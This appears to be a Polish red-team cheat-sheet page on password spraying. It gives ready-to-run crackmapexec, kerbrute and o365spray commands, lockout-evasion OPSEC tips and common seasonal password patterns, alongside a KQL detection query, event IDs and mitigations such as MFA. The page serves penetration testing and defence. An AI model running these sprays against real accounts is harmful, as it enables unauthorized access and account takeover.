---
title: "Password Spraying"
category: "red-team"
tags: ["initial-access", "credentials", "brute-force"]
platform: "agnostic"
mitre: ["T1110.003"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Password Spraying

## TL;DR
Jedno hasło (np. `Sezon2026!`) na wielu kontach — zamiast wielu haseł na jednym. Omija lockout, bo każde konto ma 1 próbę na cykl.

## Wymagania / Kontekst
- Lista użytkowników (z OSINT / enumeracji).
- Znajomość **polityki lockout** (nigdy nie przekraczaj progu!).

## Komendy
```bash
# SMB / AD (CrackMapExec) – uwaga na lockout, --continue-on-success off domyślnie
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Sezon2026!' --no-bruteforce

# Kerberos pre-auth spray (ciche, nie loguje 4625 tak samo)
kerbrute passwordspray -d corp.local users.txt 'Sezon2026!'

# OWA / O365
o365spray --spray -U users.txt -p 'Sezon2026!' --domain corp.com
```

## OPSEC
- **1 hasło na cykl**, odczekaj okno lockout (np. 30 min) między próbami.
- Rozłóż w czasie; unikaj skanowania wszystkiego naraz.
- Sezonowe/firmowe wzorce haseł: `Firma123`, `Miesiąc2026!`, `Welcome1`.

## Wykrywanie (Blue Team)
```kql
// Sentinel / Defender – wiele kont, jedno źródło, nieudane logowania
SigninLogs
| where ResultType != 0
| summarize FailedAccounts = dcount(UserPrincipalName) by IPAddress, bin(TimeGenerated, 1h)
| where FailedAccounts > 10
```
- Windows Event **4625** (failed logon) z wielu kont / jedno IP.
- Kerberos **4771** (pre-auth failed).

## Mitygacja / Hardening
- MFA (zabija większość spray'ów).
- Smart lockout (Azure AD), conditional access, blokada legacy auth.
- Zakaz słabych/sezonowych haseł (banned password list).

## Źródła
- [MITRE T1110.003](https://attack.mitre.org/techniques/T1110/003/)
